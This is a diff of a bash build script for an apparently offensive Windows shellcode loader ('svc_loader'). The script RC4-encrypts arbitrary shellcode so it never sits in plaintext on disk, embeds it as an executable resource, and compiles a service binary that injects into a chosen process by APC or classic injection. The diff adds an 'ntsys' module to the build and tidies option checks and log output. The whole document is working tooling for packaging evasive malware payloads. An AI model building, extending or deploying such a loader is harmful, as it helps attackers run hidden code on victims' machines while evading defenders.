@@ -7,6 +7,9 @@
 #      Windows/msys2: mingw-w64-x86_64-gcc / mingw-w64-i686-gcc)
 #   * a native C compiler (cc/gcc/clang) for the small RC4 pack helper
 #
+# Shared payload sources (rc4, ntsys) come from ../common/ (mirrored into the
+# operator workspace next to this module, like bof_common).
+#
 # The shellcode is RC4-encrypted with a fresh random key (or the one given
 # with --key) and embedded into the .exe as RCDATA resources by windres, so
 # the blob never sits in plaintext on disk.
@@ -136,14 +139,6 @@ while [[ $# -gt 0 ]]; do
 done
 
 # ---- toolchain selection ----
-case "$INJECT" in
-apc | ct) ;;
-*)
-  echo "[-] unsupported inject method: $INJECT (use apc or ct)" >&2
-  exit 1
-  ;;
-esac
-
 case "$ARCH" in
 x64 | amd64)
   CC="x86_64-w64-mingw32-gcc"
@@ -214,10 +209,10 @@ if ! command -v "$CC" >/dev/null 2>&1; then
   echo "    msys2:  pacman -S mingw-w64-$( [[ "$ARCH" == x64 ]] && echo x86_64 || echo i686 )-gcc" >&2
   exit 1
 fi
-WINDRES="$(find_windres)" || {
+if ! WINDRES="$(find_windres)"; then
   echo "[-] missing resource compiler (windres) for $CC" >&2
   exit 1
-}
+fi
 
 SHELLCODE_ABS="$(abspath "$SHELLCODE")"
 
@@ -240,9 +235,9 @@ echo "[+] svc_loader build:"
 echo "    shellcode: $SHELLCODE_ABS ($(wc -c <"$SHELLCODE_ABS" | tr -d '[:space:]') bytes)"
 echo "    arch:      $ARCH"
 echo "    process:   $PROCESS${PROCESS_ARGS:+ args: $PROCESS_ARGS}"
+echo "    inject:    $INJECT"
 echo "    key:       $([[ -n "$KEY" ]] && echo 'provided' || echo 'random (generated)')"
 echo "    output:    $OUTPUT_ABS"
-echo "    inject:    $INJECT"
 echo "    logging:   $([[ -n "$DEBUG_FLAG" ]] && echo 'DEBUG (verbose, keep in binary)' || echo 'none (compiled out)')"
 
 # ---- build in a scratch dir so no artifacts pollute the module tree ----
@@ -251,6 +246,7 @@ trap 'rm -rf "$BUILDDIR"' EXIT
 
 cp "$SCRIPT_DIR"/loader.c "$SCRIPT_DIR"/loader.rc "$SCRIPT_DIR"/loader_ids.h \
   "$SCRIPT_DIR"/../common/rc4.c "$SCRIPT_DIR"/../common/rc4.h \
+  "$SCRIPT_DIR"/../common/ntsys.c "$SCRIPT_DIR"/../common/ntsys.h \
   "$SCRIPT_DIR"/config.h "$SCRIPT_DIR"/pack.c \
   "$BUILDDIR"/
 
@@ -286,11 +282,12 @@ fi
 # ---- compile loader + resources (MinGW-w64) ----
 INJECT_FLAG=""
 [[ "$INJECT" == ct ]] && INJECT_FLAG="-DCLASSIC_INJECT"
-"$CC" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} $INJECT_FLAG -DUNICODE -D_UNICODE -DWINVER=0x0601 \
-  -D_WIN32_WINNT=0x0601 -I. -c loader.c -o loader.o
+"$CC" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} $INJECT_FLAG -DUNICODE -D_UNICODE \
+  -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -I. -c loader.c -o loader.o
+"$CC" -O2 -Wall -Wextra -I. -c ntsys.c -o ntsys.o
 "$CC" -O2 -Wall -Wextra -c rc4.c -o rc4.o
 "$WINDRES" --target="$WINTARGET" -I. -i loader.rc -o resources.o
-"$CC" -O2 -s -o loader_svc.exe loader.o rc4.o resources.o -ladvapi32 -lshell32
+"$CC" -O2 -s -o loader_svc.exe loader.o rc4.o ntsys.o resources.o -ladvapi32 -lshell32
 
 # ---- sanity check the PE before copying it out ----
 if [[ ! -s loader_svc.exe ]]; then
